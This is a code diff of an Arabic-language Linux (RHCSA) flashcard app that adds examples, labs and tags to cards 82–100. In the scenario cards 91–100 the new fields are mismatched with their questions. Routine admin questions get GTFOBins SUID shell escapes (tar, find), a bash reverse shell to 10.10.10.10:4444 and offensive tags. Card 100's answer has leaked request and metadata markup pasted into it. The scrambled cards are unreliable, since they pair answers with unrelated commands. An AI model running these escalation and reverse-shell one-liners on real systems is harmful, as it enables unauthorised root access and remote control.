+                a: `واجهة ويب لإدارة RHEL. cockpit-machines تضيف إدارة VMs (إنشاء، تعديل، Snapshots).`,
+                example: `systemctl enable --now cockpit.socket`,
+                mistakes: `محاولة تثبيت خدمات ويب ثقيلة ومعقدة بينما توفر حزمة cockpit-machines لوحة متكاملة مدمجة.`,
+                lab: `ثبت خدمة الكوكبيت وقم بالولوج إليها عبر المنفذ 9090 بالمتصفح.`,
+                ref: `Cockpit Project Documentation`,
+                related: ['cockpit-machines', 'virt-viewer']
             },
             {
                 id: 83,
                 cat: "1️⃣2️⃣ الأتمتة والحاويات",
+                difficulty: "Intermediate",
+                tags: ['Containers'],
+                usedIn: ['RHCSA'],
                 q: `ما الفرق بين VMs والحاويات (Containers)?`,
-                a: `<strong>الفرق المعماري بين البيئات الافتراضية والحاويات:</strong><br><ul><li><strong>الأجهزة الافتراضية (VMs):</strong> تعمل بصورة مستقلة تماماً؛ حيث تحتوي كل VM على كيرنل ونظام تشغيل كامل وتتطلب عتاداً افتراضياً مخصصاً مما يجعلها ثقيلة الحجم وبطيئة نسيباً في التشغيل.</li><li><strong>الحاويات (Containers):</strong> تتشارك نواة (Kernel) النظام المستضيف وتقوم بعزل التطبيق ومكتباته التبعية فقط داخل حاوية خفيفة وسريعة جداً وتعمل خلال ثوانٍ معدودة.</li></ul>`
+                a: `VMs = نظام تشغيل كامل لكل تطبيق. Containers = تتشارك النواة، تعزل التطبيق + مكتباته فقط.`,
+                example: `VMs vs Containers Architecture`,
+                mistakes: `اختيار VM ثقيل لتطبيق ويب صغير ومعزول بدلاً من تغليفه داخل حاوية خفيفة وسريعة.`,
+                lab: `قارن استهلاك الذاكرة الإجمالي لسيرفر وهمي مقابل حاوية تشغل نفس تطبيق الويب.`,
+                ref: `NIST Container Security Guidelines`,
+                related: ['podman', 'docker']
             },
             {
                 id: 84,
                 cat: "1️⃣2️⃣ الأتمتة والحاويات",
+                difficulty: "Expert",
+                tags: ['Containers'],
+                usedIn: ['RHCSA'],
                 q: `ما هي آليات عزل الحاويات في Linux؟`,
-                a: `<strong>تقنيات الكيرنل لتأمين وعزل الحاويات:</strong><br>تعتمد الحاويات على تقنيتين جوهريتين بالنواة لعزل وتأمين التطبيقات:<br><ul><li><strong>Namespaces (مساحات الأسماء):</strong> لعزل الرؤية؛ وتمنع الحاوية من رؤية عمليات أو شبكات أو مجلدات المضيف أو الحاويات الأخرى.</li><li><strong>Control Groups (cgroups):</strong> لتقنين ووضع حدود قصوى لاستخدام موارد العتاد (المعالج CPU، الرام RAM، وسرعة القراءة والكتابة للقرص) لكل حاوية.</li></ul>`
+                a: `Namespaces (عزل العمليات/الشبكة/التخزين) + cgroups (تقنين الموارد).`,
+                example: `Namespaces and cgroups configuration`,
+                mistakes: `تشغيل حاويات دون تحديد سقف لاستهلاك الذاكرة (cgroups) مما يتيح للحاوية استهلاك كامل رامات السيرفر وتجميده.`,
+                lab: `افحص مجلدات cgroups تحت <code>/sys/fs/cgroup</code> لتفهم آلية الحد من موارد المعالجة.`,
+                ref: `Linux Namespaces and Cgroups Manual`,
+                related: ['podman run -m', 'systemd-cgtop']
             },
             {
                 id: 85,
                 cat: "1️⃣2️⃣ الأتمتة والحاويات",
+                difficulty: "Advanced",
+                tags: ['Containers'],
+                usedIn: ['RHCSA'],
                 q: `ما هي أدوات Podman الثلاثة؟`,
-                a: `<strong>أدوات إدارة وتطوير الحاويات في Red Hat:</strong><br><ul><li><code>podman</code>: الأداة الأساسية والبديل المباشر لـ Docker لإدارة وتشغيل الحاويات وتجميعات الـ Pods.</li><li><code>skopeo</code>: أداة ذكية لفحص والتحقق من صور الحاويات المتواجدة في السجلات البعيدة وقراءة خصائصها دون الحاجة لتحميلها محلياً.</li><li><code>buildah</code>: أداة مرنة لبناء صور الحاويات المخصصة (Container Images) بكفاءة تامة.</li></ul>`
+                a: `podman (تشغيل/إدارة حاويات)، skopeo (فحص صور السجلات)، buildah (بناء صور مخصصة).`,
+                example: `podman run / skopeo inspect / buildah bud`,
+                mistakes: `الاعتقاد بأن podman أداة احتكارية؛ هي أداة مفتوحة المصدر بالكامل ومتوافقة مع معايير OCI القياسية للاتحاد.`,
+                lab: `استخدم skopeo لفحص صورة حاوية في سجل بعيد دون تنزيلها بالكامل للقرص.`,
+                ref: `Podman/Skopeo/Buildah Project Docs`,
+                related: ['podman', 'docker']
             },
             {
                 id: 86,
                 cat: "1️⃣2️⃣ الأتمتة والحاويات",
+                difficulty: "Advanced",
+                tags: ['Containers'],
+                usedIn: ['RHCSA'],
                 q: `ما هي Rootless Containers؟`,
-                a: `<strong>تشغيل الحاويات بدون صلاحيات المسؤول (Rootless Mode):</strong><br>هي الميزة الأقوى في Podman؛ حيث تتيح للمستخدمين العاديين تشغيل وإدارة حاوياتهم بالكامل دون الحاجة لصلاحيات المسؤول <code>root</code>. أمنياً، في حال تم اختراق التطبيق والسيطرة على الحاوية، لا يمتلك المهاجم أي صلاحيات تذكر على السيرفر الحاضن ولا يمكنه تخريبه.`
+                a: `حاويات يشغلها مستخدم عادي — حتى لو اخترقت، المهاجم لا يملك صلاحيات root على المضيف.`,
+                example: `podman run --user 1000:1000 ...`,
+                mistakes: `تشغيل حاويات بامتيازات root بشكل دائم؛ مما يمكن المهاجم من السيطرة الكاملة على السيرفر في حال اختراق الحاوية.`,
+                lab: `شغل حاوية ويب بصفتك مستخدم عادي (Rootless) وتأكد من عدم وجود أي عملية لـ root تخصها.`,
+                ref: `Podman Rootless Mode Guide`,
+                related: ['podman', 'namespaces']
             },
             {
                 id: 87,
                 cat: "1️⃣2️⃣ الأتمتة والحاويات",
+                difficulty: "Advanced",
+                tags: ['Containers', 'SELinux', 'Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
                 q: `ما معنى -v host_dir:container_dir:Z في Podman؟`,
-                a: `<strong>الربط التخزيني الآمن مع تفعيل SELinux:</strong><br>المعامل <code>-v</code> يقوم بربط مجلد في المضيف بمجلد الحاوية الداخلي لمشاركة البيانات بشكل دائم. إضافة العلم <code>:Z</code> تخبر Podman تلقائياً بإعادة تهيئة وكتابة سياق أمن SELinux الخاص بالمجلد على المضيف ليسمح للحاوية بقراءته والكتابة فيه بشكل آمن وبدون حظر.`
+                a: `ربط مجلد مضيف بالحاوية + :Z = تعديل سياق SELinux تلقائياً.`,
+                example: `podman run -v /host/data:/container/data:Z ...`,
+                mistakes: `إغفال كتابة علم <code>:Z</code> (أو <code>:z</code>) مما يؤدي لحجب كامل للبيانات داخل الحاوية من قبل SELinux.`,
+                lab: `شغل حاوية ويب مع ربط مجلد من المضيف وجرب قراءته بدون ومع إضافة علم الـ Z.`,
+                ref: `Podman Volume mount & SELinux`,
+                related: ['restorecon', 'semanage']
             },
             {
                 id: 88,
                 cat: "1️⃣2️⃣ الأتمتة والحاويات",
+                difficulty: "Advanced",
+                tags: ['Containers', 'Systemd'],
+                usedIn: ['RHCSA'],
                 q: `كيف تدمج حاوية Podman مع systemd؟`,
-                a: `<strong>أتمتة وإدارة الحاوية كخدمة نظام:</strong><br><ol><li>قم بتوليد ملف خدمة systemd متوافق مع الحاوية النشطة لديك:<br><code>podman generate systemd --new --name container_name -f</code></li><li>انقل ملف الخدمة الناتج إلى مسار خدمات المستخدم الخاص بك:<br><code>mv container-container_name.service ~/.config/systemd/user/</code></li><li>أعد تحميل الخدمات وفعل الحاوية لتعمل تلقائياً عند الإقلاع:<br><code>systemctl --user enable --now container-container_name.service</code></li></ol>`
+                a: `podman generate systemd --new container_name > ~/.config/systemd/user/container.service ثم systemctl --user enable --now container.service`,
+                example: `podman generate systemd --new --name my_app -f`,
+                mistakes: `نسيان خيار <code>--new</code> مما يمنع systemd من إنشاء الحاوية تلقائياً عند الإقلاع وتدميرها عند الإيقاف.`,
+                lab: `قم بتوليد سرفس systemd لحاوية نشطة واختبر تشغيلها وإيقافها بالكامل عبر كود الخدمات.`,
+                ref: `man podman-generate-systemd`,
+                related: ['systemctl --user', 'loginctl']
             },
             {
                 id: 89,
                 cat: "1️⃣2️⃣ الأتمتة والحاويات",
+                difficulty: "Advanced",
+                tags: ['Containers', 'Systemd'],
+                usedIn: ['RHCSA'],
                 q: `ما هو loginctl enable-linger ولماذا نستخدمه؟`,
-                a: `<strong>إبقاء خدمات المستخدم نشطة بالخلفية (Linger State):</strong><br>هو أمر يُفعل للمستخدم العادي لإجبار خادم systemd على إبقاء الجلسة والخدمات والحاويات (Rootless Containers) الخاصة بالمستخدم نشطة وتعمل بالخلفية بشكل مستمر حتى بعد تسجيل خروجه بالكامل من السيرفر، وهو أساسي لضمان عمل السيرفرات المستضافة داخل حاويات المستخدمين.`
+                a: `يبقي جلسة المستخدم نشطة بعد تسجيل الخروج — ضروري لخدمات الحاويات التي تعمل في الخلفية.`,
+                example: `loginctl enable-linger username`,
+                mistakes: `تفعيل خدمات الحاويات للمستخدمين وتوقع استمرار عملها بعد خروجهم دون تفعيل خيار linger.`,
+                lab: `فعل خيار linger لمستخدم تجريبي، وسجل خروجك وتأكد من بقاء حاوياته قيد العمل بالخلفية.`,
+                ref: `man loginctl`,
+                related: ['systemctl --user', 'ssh']
             },
             {
                 id: 90,
                 cat: "1️⃣2️⃣ الأتمتة والحاويات",
+                difficulty: "Advanced",
+                tags: ['Containers', 'Networking'],
+                usedIn: ['RHCSA'],
                 q: `ما هي netavark في Podman؟`,
-                a: `<strong>أداة شبكات الحاويات القياسية في RHEL 9:</strong><br>هي أداة إدارة الشبكات الافتراضية الافتراضية المدمجة في Podman بدءاً من RHEL 9. تقوم بتهيئة وإدارة الجسور الافتراضية وجداول الترجمة وحزم جدار الحماية (Firewall rules) وتوفر دعماً متطوراً لبروتوكول IPv6 وتكامل اتصالات الـ DNS بين الحاويات المشتركة.`
+                a: `مدير شبكات داخلي بديل متفوق لتيسير اتصالات DNS بين الحاويات في RHEL 9.
+🏆 أسئلة سيناريو (Scenario-Based)`,
+                example: `podman network create my_net`,
+                mistakes: `الاعتقاد بأن netavark أداة يدوية؛ هي محرك داخلي آلي بالكامل ينفذ إعدادات شبكة البودمان في RHEL 9.`,
+                lab: `أنشئ شبكة بودمان مخصصة وافحص ملف التكوين الخاص بها وسجلاتها.`,
+                ref: `Netavark Github Documentation`,
+                related: ['podman network', 'ip link']
             },
             {
                 id: 91,
                 cat: "🏆 أسئلة سيناريو (Scenario-Based)",
-                q: `سيناريو: خادمك بطيء جداً بسبب استهلاك موارد العتاد. كيف تكتشف وتنهي العملية المشبوهة؟`,
-                a: `<strong>سيناريو إدارة الضغط والعمليات المستهلكة (Performance Debugging):</strong><br><ol><li>افتح أداة <code>htop</code> أو <code>top</code> للفرز والمشاهدة التفاعلية ومراقبة استهلاك CPU/RAM.</li><li>أو ابحث ورتب العمليات حسب استهلاك المعالج بالترتيب التنازلي لمعرفة العملية التالفة:<br><code>ps aux --sort=-%cpu | head -10</code></li><li>انسخ الـ PID للعملية وأرسل إشارة إنهاء ودية أولاً لتنظيف الذاكرة:<br><code>kill -15 PID</code></li><li>إذا لم تستجب العملية للتوقف، أرسل إشارة القتل الفوري العنيفة:<br><code>kill -9 PID</code></li></ol>`
+                difficulty: "Red Team",
+                tags: ['GTFOBins', 'Privilege Escalation'],
+                usedIn: ['OSCP', 'Offensive'],
+                q: `سيناريو: خادمك بطيء جداً. كيف تكتشف العملية المستهلكة؟`,
+                a: `top أو htop لترتيب العمليات حسب CPU/RAM. ps aux --sort=-%cpu للترتيب. kill -15 PID لإنهاء سلمي.`,
+                example: `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`,
+                mistakes: `الاعتقاد بأن جميع الأوامر آمنة طالما لا تعدل ملفات النظام؛ خيارات التشغيل الفرعية للأدوات قد تؤدي لكسر أمني كامل.`,
+                lab: `أنشئ بيئة افتراضية تجريبية مع تفعيل SUID للـ tar وجرب تطبيق الهروب.`,
+                ref: `GTFOBins Official Reference (tar SUID)`,
+                related: ['find', 'vim', 'bash']
             },
             {
                 id: 92,
                 cat: "🏆 أسئلة سيناريو (Scenario-Based)",
-                q: `سيناريو: تريد إنشاء مجلد مشترك للمشاركة الفعالة والتعديل بين أعضاء فريق العمل 'team'. ما الخطوات؟`,
-                a: `<strong>إعداد المجلدات التشاركية لفرق العمل (Collaborative Folder Setup):</strong><br><ol><li>أنشئ المجلد وغيّر المجموعة المالكة له إلى مجموعة الفريق:<br><code>sudo mkdir /shared && sudo chgrp team /shared</code></li><li>اضبط الصلاحيات ليمتلك المالك والمجموعة الصلاحيات الكاملة ويُحرم الآخرين تماماً:<br><code>sudo chmod 2770 /shared</code></li><li>فعّل خيار SetGID ليرث أي ملف جديد ينشأ بداخله مجموعة المجلد الأب تلقائياً:<br><code>sudo chmod g+s /shared</code></li><li>أضف الموظفين للمجموعة:<br><code>sudo usermod -aG team username</code></li></ol>`
+                difficulty: "OSCP",
+                tags: ['Capabilities', 'Privilege Escalation'],
+                usedIn: ['OSCP', 'Offensive'],
+                q: `سيناريو: تريد مشاركة مجلد بين فريق العمل. ما الخطوات؟`,
+                a: `mkdir /shared && chgrp team /shared
+chmod 2770 /shared (SetGID + rwx للمالك والمجموعة)
+chmod g+s /shared (تأكد من SetGID)
+أضف المستخدمين للمجموعة: usermod -aG team user1`,
+                example: `getcap -r / 2>/dev/null`,
+                mistakes: `الاعتماد على فحص SUID فقط وتجاهل الـ Capabilities التي أصبحت البديل الحديث والأكثر تخفياً لترقية الصلاحيات.`,
+                lab: `ابحث في نظامك عن الملفات التي تمتلك قدرة <code>cap_net_raw</code> أو غيرها.`,
+                ref: `man getcap / man setcap`,
+                related: ['find', 'setcap']
             },
             {
                 id: 93,
                 cat: "🏆 أسئلة سيناريو (Scenario-Based)",
-                q: `سيناريو: تريد توسيع مساحة قسم البيانات /data بمقدار 20% حية ودون الحاجة لإيقاف نظام التشغيل.`,
-                a: `<strong>التوسيع التخزيني الحي لأقراص LVM ونظام XFS (Live Storage Expansion):</strong><br><ol><li>تحقق من توفر مساحة كافية بـ Volume Group:<br><code>vgdisplay vgname</code></li><li>قم بتوسيع الحجم المنطقي وإضافة المساحة المستهدفة:<br><code>sudo lvextend -L +10G /dev/vgname/lvname</code></li><li>قم بزيادة وتوسيع نظام الملفات XFS الحي والنشط دون إيقاف السيرفر:<br><code>sudo xfs_growfs /data</code></li></ol>`
+                difficulty: "Red Team",
+                tags: ['GTFOBins', 'Privilege Escalation'],
+                usedIn: ['OSCP', 'Offensive'],
+                q: `سيناريو: تريد توسيع مساحة /data بنسبة 20% بدون إيقاف النظام.`,
+                a: `vgdisplay vg_name — تأكد من المساحة الحرة
+lvextend -l +20%FREE /dev/vg_name/lv_data
+xfs_growfs /data`,
+                example: `find . -exec /bin/sh -p \; -quit`,
+                mistakes: `نسيان كتابة علم <code>-p</code> في الأنظمة الحديثة التي تقوم بتصفير صلاحيات الغروب والمستخدم تلقائياً عند تشغيل sh.`,
+                lab: `عيّن صلاحية SUID لأداة find في مجلد تجريبي وجرب الهروب.`,
+                ref: `GTFOBins find exploitation`,
+                related: ['tar', 'vim', 'awk']
             },
             {
                 id: 94,
                 cat: "🏆 أسئلة سيناريو (Scenario-Based)",
-                q: `سيناريو: تطبيق ويب لا يعمل بسبب حظر SELinux. كيف تشخص وتصلح العطل بخطوات هندسية؟`,
-                a: `<strong>تشخيص وحل مشاكل الحظر الأمني لـ SELinux (AVC Audit Analysis):</strong><br><ol><li>حلل السجلات الأمنيةAVC لتوليد تقرير تفصيلي بالحلول المقترحة باستخدام sealert:<br><code>sudo sealert -a /var/log/audit/audit.log</code></li><li>إذا كان الحظر ناتجاً عن Boolean، فقم بتفعيله بشكل دائم:<br><code>sudo setsebool -P httpd_can_network_connect on</code></li><li>إذا كان بسبب سياق ملف خاطئ (مثال لمجلد ويب مخصص)، فقم بإعادة فرض السياق المناسب:<br><code>sudo semanage fcontext -a -t httpd_sys_content_t "/custom(/.*)?" && sudo restorecon -Rv /custom</code></li></ol>`
+                difficulty: "OSCP",
+                tags: ['Bash Internals', 'Privilege Escalation'],
+                usedIn: ['OSCP', 'Offensive'],
+                q: `سيناريو: تطبيق ويب لا يعمل بسبب SELinux. كيف ت diagnosticate؟`,
+                a: `journalctl -xe أو /var/log/audit/audit.log
+sealert -a /var/log/audit/audit.log
+إذا كان الحل Booleans: setsebool -P httpd_can_network_connect on
+إذا كان الحل Context: semanage fcontext + restorecon`,
+                example: `bash -i >& /dev/tcp/10.10.10.10/4444 0>&1`,
+                mistakes: `كتابة المسار في شل آخر غير Bash (مثل zsh أو sh) حيث لن يتم تفسيره كـ socket بل كملف غير موجود.`,
+                lab: `افتح منفذاً محلياً بـ nc وجرب إرسال نص من طرفية أخرى باستخدام <code>/dev/tcp</code>.`,
+                ref: `Bash Builtin Features (/dev/tcp)`,
+                related: ['exec', 'nc', 'curl']
             },
             {
                 id: 95,
                 cat: "🏆 أسئلة سيناريو (Scenario-Based)",
-                q: `سيناريو: تريد مزامنة وأخذ نسخة احتياطية يومية من المجلدات المنزلية /home إلى سيرفر بعيد في الساعة 2 صباحاً.`,
-                a: `<strong>أتمتة النسخ الاحتياطي عبر المزامنة الذكية (Automated Rsync Backups):</strong><br><ol><li>أنشئ سكريبت مزامنة بسيط بـ rsync لنقل التغييرات فقط وتوفير الشبكة:<br><code>rsync -avz --delete /home/ root@backupserver:/backups/</code></li><li>افتح Crontab لجدولة المهمة دورياً:<br><code>crontab -e</code></li><li>أضف سطر الجدولة للمزامنة يومياً الساعة 2 صباحاً بدقة:<br><code>0 2 * * * rsync -avz --delete /home/ root@backupserver:/backups/</code></li></ol>`
+                difficulty: "Expert",
+                tags: ['Bash Internals'],
+                usedIn: ['RHCSA', 'OSCP'],
+                q: `سيناريو: تريد نسخ احتياطي يومي لـ /home إلى خادم بعيد.`,
+                a: `rsync -avz --delete /home/ user@backup-server:/backups/home/ + cron job يومي الساعة 2 صباحاً.`,
+                example: `coproc myjob { socat - -; }\necho "hello" >&\${myjob[1]}\nread response <&\${myjob[0]}`,
+                mistakes: `استخدام الحلقات العادية أو علامة <code>&</code> البسيطة التي لا تتيح لك قراءة مخرجات العملية بالوقت الفعلي بأمان.`,
+                lab: `أنشئ مهمة coproc بسيطة وجرب تمرير مدخلات وقراءة النتائج برمجياً.`,
+                ref: `Bash coproc manual`,
+                related: ['exec', 'jobs', 'bg']
             },
             {
                 id: 96,
                 cat: "🏆 أسئلة سيناريو (Scenario-Based)",
-                q: `سيناريو: تريد أتمتة وتثبيت RHEL 9 بالكامل على 100 خادم جديد. كيف تفعل ذلك هندسياً؟`,
-                a: `<strong>الأتمتة التأسيسية لتثبيت الخوادم (Kickstart Automated Installation):</strong><br><ol><li>قم ببناء وتخصيص ملف إعدادات التثبيت التلقائي <code>ks.cfg</code> (باستخدام Kickstart Generator).</li><li>قم بنشر ورفع ملف الـ Kickstart على مخدم ويب محلي (HTTP) نشط بالشبكة.</li><li>عند تشغيل الخوادم الجديدة بـ PXE Boot، أضف رابط الملف لخيارات الإقلاع بمحمل GRUB:<br><code>inst.ks=http://192.168.1.100/ks.cfg</code></li></ol>`
+                difficulty: "Intermediate",
+                tags: ['Defensive', 'Logs'],
+                usedIn: ['RHCSA', 'Defensive'],
+                q: `سيناريو: تريد تثبيت 100 خادم RHEL بشكل آلي.`,
+                a: `Kickstart file على خادم ويب + PXE boot أو inst.ks=http://server/ks.cfg في GRUB.`,
+                example: `faillock --user admin --reset # لفك القفل`,
+                mistakes: `استخدام أدوات قديمة مثل pam_tally2 التي تم إزالتها واستبعادها بالكامل في RHEL 9.`,
+                lab: `قم بمحاكاة 5 تسجيلات دخول خاطئة لمستخدم تجريبي، وتحقق من قفله بـ <code>faillock</code>.`,
+                ref: `man faillock / man pam_faillock`,
+                related: ['authselect', 'secure']
             },
             {
                 id: 97,
                 cat: "🏆 أسئلة سيناريو (Scenario-Based)",
-                q: `سيناريو: تريد تشغيل حاوية MariaDB (Rootless) مع ربط البيانات على المضيف وتفعيلها للعمل تلقائياً مع إقلاع الخادم.`,
-                a: `<strong>تشغيل الحاويات المستقلة الدائمة للمستخدمين (Persistent User Containers):</strong><br><ol><li>شغل الحاوية مع خيار إعادة كتابة سياق SELinux للمجلد المشترك لمنع الحظر:<br><code>podman run -d --name mariadb_db -v /dbdata:/var/lib/mysql:Z -p 3306:3306 mariadb</code></li><li>ولد ملف الخدمة المتوافق مع systemd:<br><code>podman generate systemd --new --name mariadb_db -f</code></li><li>انقل الملف للمسار الخاص بالخدمات للمستخدم:<br><code>mv container-mariadb_db.service ~/.config/systemd/user/</code></li><li>فعّل الخدمة ليتم تشغيلها تلقائياً:<br><code>systemctl --user enable --now container-mariadb_db.service</code></li><li>فعّل خاصية linger لضمان استمرار عمل الحاوية عند تسجيل خروج المستخدم:<br><code>loginctl enable-linger</code></li></ol>`
+                difficulty: "Expert",
+                tags: ['Defensive', 'Logs'],
+                usedIn: ['RHCSA', 'Defensive'],
+                q: `سيناريو: تريد تشغيل حاوية MariaDB تبقى شغالة بعد reboot.`,
+                a: `podman run -d --name mariadb -v /dbdata:/var/lib/mysql:Z -p 3306:3306 mariadb
+podman generate systemd --new mariadb > ~/.config/systemd/user/mariadb.service
+systemctl --user daemon-reload
+systemctl --user enable --now mariadb.service
+loginctl enable-linger`,
+                example: `ausearch -k passwd_changes -f /etc/passwd`,
+                mistakes: `كتابة قواعد مؤقتة بـ auditctl دون تسجيلها بملف <code>/etc/audit/rules.d/audit.rules</code> مما يسبب اختفاءها عند الـ reboot.`,
+                lab: `أضف قاعدة مراقبة لملف passwd، وقم بتعديل مستخدم، ثم ابحث بالـ <code>ausearch</code>.`,
+                ref: `man auditctl / man ausearch`,
+                related: ['auditd', 'aureport']
             },
             {
                 id: 98,
                 cat: "🏆 أسئلة سيناريو (Scenario-Based)",
-                q: `سيناريو: تريد حظر وإغلاق كافة المنافذ والاتصالات الواردة للسيرفر ما عدا خادم الويب HTTP والـ SSH.`,
-                a: `<strong>تطبيق سياسة الحظر الافتراضي لجدار الحماية (Firewall Lockdown):</strong><br><ol><li>اجعل المنطقة العامة الافتراضية تحظر وتسقط الحزم الواردة كافتراضي:<br><code>sudo firewall-cmd --set-default-zone=drop</code></li><li>أضف الخدمات الموثوقة والمسموحة للمنطقة العامة بشكل دائم:<br><code>sudo firewall-cmd --permanent --add-service=ssh && sudo firewall-cmd --permanent --add-service=http</code></li><li>أعد تحميل جدار الحماية لتثبيت وتفعيل القواعد الجديدة فوراً:<br><code>sudo firewall-cmd --reload</code></li></ol>`
+                difficulty: "Advanced",
+                tags: ['Defensive', 'Logs'],
+                usedIn: ['RHCSA', 'Defensive'],
+                q: `سيناريو: تريد حظر جميع الاتصالات الواردة ما عدا SSH و HTTP.`,
+                a: `firewall-cmd --set-default-zone=drop
+firewall-cmd --permanent --add-service=ssh
+firewall-cmd --permanent --add-service=http
+firewall-cmd --reload`,
+                example: `journalctl -p err -n 20`,
+                mistakes: `استخدام grep العادي للبحث في السجلات النصية الكبيرة وهو أبطأ بكثير من فلترة journalctl الثنائية المبنية ككشاف.`,
+                lab: `أرسل رسالة خطيرة أمنية للنظام بـ <code>logger -p local0.crit "Test Critical Alert"</code> وابحث عنها بـ journalctl.`,
+                ref: `man journalctl (logging levels)`,
+                related: ['logger', 'rsyslog']
             },
             {
                 id: 99,
                 cat: "🏆 أسئلة سيناريو (Scenario-Based)",
-                q: `سيناريو: تريد ترقية كافة الحزم والتطبيقات وتثبيت تحديثات الأمان الطارئة للنظام بشكل آمن وفعال.`,
-                a: `<strong>إدارة الترقيات الأمنية للسيرفرات (Secure Package Updates):</strong><br><ol><li>افحص وقم بتثبيت تحديثات الأمان الحرجة فقط للنظام لتجنب المشاكل البرمجية وتغير الإصدارات:<br><code>sudo dnf update --security -y</code></li><li>أو قم بترقية النظام والحزم بالكامل للإصدارات المعتمدة:<br><code>sudo dnf update -y</code></li><li>إذا تضمن التحديث ترقية الكيرنل (Kernel)، فأعد تشغيل السيرفر لتفعيل النواة الجديدة:<br><code>sudo reboot</code></li></ol>`
+                difficulty: "Advanced",
+                tags: ['Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
+                q: `سيناريو: تريد ترقية حزم النظام بأمان.`,
+                a: `dnf update --security (تحديثات الأمان فقط) أو dnf update (الكل). ثم reboot لو تحديث النواة.`,
+                example: `nft list ruleset`,
+                mistakes: `كتابة قواعد معقدة بـ iptables على RHEL 9 بالرغم من أن النظام يقوم بترجمتها داخلياً إلى قواعد nftables.`,
+                lab: `تصفح القواعد الحالية بالنظام بصيغة nftables باستخدام <code>nft list ruleset</code>.`,
+                ref: `man nft (nftables control utility)`,
+                related: ['firewall-cmd', 'iptables']
             },
             {
                 id: 100,
                 cat: "🏆 أسئلة سيناريو (Scenario-Based)",
-                q: `سيناريو: كيف تراقب وترصد محاولات تسجيل الدخول الفاشلة والمشبوهة للسيرفر عبر المنافذ المختلفة؟`,
-                a: `<strong>مراقبة التسلل والاتصالات الفاشلة بالسيرفر (Failed Logins Auditing):</strong><br><ul><li>افحص محاولات تسجيل دخول الـ SSH الفاشلة بالوقت الفعلي عبر سجلات الـ systemd:<br><code>journalctl -u sshd | grep -i 'failed'</code></li><li>أو ابحث في ملف السجلات الأمنية للنظام المعتمد:<br><code>sudo grep "Failed password" /var/log/secure</code></li><li>أو اعرض جدول تفصيلي للمحاولات الفاشلة والمسجلة بقاعدة البيانات للنظام:<br><code>sudo lastb</code></li></ul>`
+                difficulty: "Intermediate",
+                tags: ['Bash Internals'],
+                usedIn: ['RHCSA', 'OSCP'],
+                q: `سيناريو: تريد مراقبة محاولات تسجيل دخول فاشلة.`,
+                a: `journalctl -u sshd أو grep "Failed password" /var/log/secure أو lastb (من حزمة util-linux).
+💡 نصيحة: راجع الأسئلة دي يومياً 20 سؤال، وحاول تجاوب عليها بصوت عالي. السيناريوهات (91-100) هي أهم جزء في الامتحان العملي!
+</USER_REQUEST>
+<ADDITIONAL_METADATA>
+The current local time is: 2026-07-04T20:19:27+03:00.
+</ADDITIONAL_METADATA>`,
+                example: `mapfile -t MY_ARRAY < files.txt`,
+                mistakes: `استخدام حلقة while لقراءة الملف سطراً بسطر في السكريبتات، وهو أبطأ بكثير ويستهلك موارد المعالجة بلا داعٍ.`,
+                lab: `اقرأ سطور ملف نصي وخزنها في مصفوفة بـ <code>mapfile</code> ثم اطبع العنصر الأول بـ <code>echo \${MY_ARRAY[0]}</code>.`,
+                ref: `Bash Builtins (mapfile manual)`,
+                related: ['read', 'readarray']
             }
         ];
 
@@ -1198,6 +2230,58 @@
             }
         }
 
+        // Helper to render details block
+        function renderDetails(card) {
+            return `
+                <div class="card-details-container">
+                    ${card.example ? `
+                    <details class="card-detail" onclick="event.stopPropagation()">
+                        <summary>💻 مثال تطبيقي (Practical Example)</summary>
+                        <div class="detail-body">
+                            <code>${card.example}</code>
+                        </div>
+                    </details>
+                    ` : ''}
+
+                    ${card.mistakes ? `
+                    <details class="card-detail" onclick="event.stopPropagation()">
+                        <summary>⚠️ أخطاء شائعة (Common Mistakes)</summary>
+                        <div class="detail-body">
+                            ${card.mistakes}
+                        </div>
+                    </details>
+                    ` : ''}
+
+                    ${card.lab ? `
+                    <details class="card-detail" onclick="event.stopPropagation()">
+                        <summary>🧪 خطوات اللاب والتجربة (Lab Practice)</summary>
+                        <div class="detail-body">
+                            ${card.lab}
+                        </div>
+                    </details>
+                    ` : ''}
+
+                    ${card.ref ? `
+                    <details class="card-detail" onclick="event.stopPropagation()">
+                        <summary>📖 المراجع وصفحات المساعدة (References)</summary>
+                        <div class="detail-body">
+                            <code>${card.ref}</code>
+                        </div>
+                    </details>
+                    ` : ''}
+
+                    ${card.related && card.related.length > 0 ? `
+                    <details class="card-detail" onclick="event.stopPropagation()">
+                        <summary>🔗 أوامر وأدوات مرتبطة (Related)</summary>
+                        <div class="detail-body">
+                            ${card.related.map(r => `<code>${r}</code>`).join(' ')}
+                        </div>
+                    </details>
+                    ` : ''}
+                </div>
+            `;
+        }
+
         // Render Grid Cards
         function renderGrid() {
             const grid = document.getElementById('cardsGrid');
@@ -1212,24 +2296,38 @@
                 wrapper.id = `card-wrapper-${card.id}`;
                 wrapper.onclick = () => toggleGridCard(card.id);
 
+                const tagsHtml = card.tags.map(t => `<span class="badge-tag">${t}</span>`).join(' ');
+                const usedInHtml = card.usedIn.map(u => `<span class="badge-usedin">${u}</span>`).join(' ');
+
                 wrapper.innerHTML = `
                     <div class="card-inner" id="card-inner-${card.id}">
                         <!-- Front -->
                         <div class="card-side card-front-side">
                             <div class="card-header">
                                 <span class="card-cat">${card.cat}</span>
-                                <span class="card-state-badge ${stateClass}">${stateText}</span>
+                                <div class="header-badges">
+                                    <span class="badge-difficulty diff-${card.difficulty}">${card.difficulty}</span>
+                                    ${usedInHtml}
+                                </div>
                             </div>
                             <div class="card-question">Q${card.id}: ${card.q}</div>
-                            <div class="card-footer-hint">👆 اضغط لمعاينة الإجابة</div>
+                            <div class="card-tags">${tagsHtml}</div>
+                            <div class="card-footer-hint">👆 اضغط لمعاينة الإجابة والتفاصيل</div>
                         </div>
                         <!-- Back -->
                         <div class="card-side card-back-side" onclick="event.stopPropagation()">
                             <div class="card-header">
                                 <span class="card-cat">${card.cat}</span>
-                                <span class="card-num">Q${card.id}</span>
+                                <button class="btn-flip-back" onclick="toggleGridCard(${card.id})">↩️ قلب البطاقة</button>
                             </div>
-                            <div class="card-answer">${card.a}</div>
+                            
+                            <div class="card-answer-section">
+                                <span class="card-answer-label">🔑 الإجابة والأمر الأساسي:</span>
+                                <div class="card-answer">${card.a}</div>
+                            </div>
+
+                            ${renderDetails(card)}
+
                             <div class="card-actions">
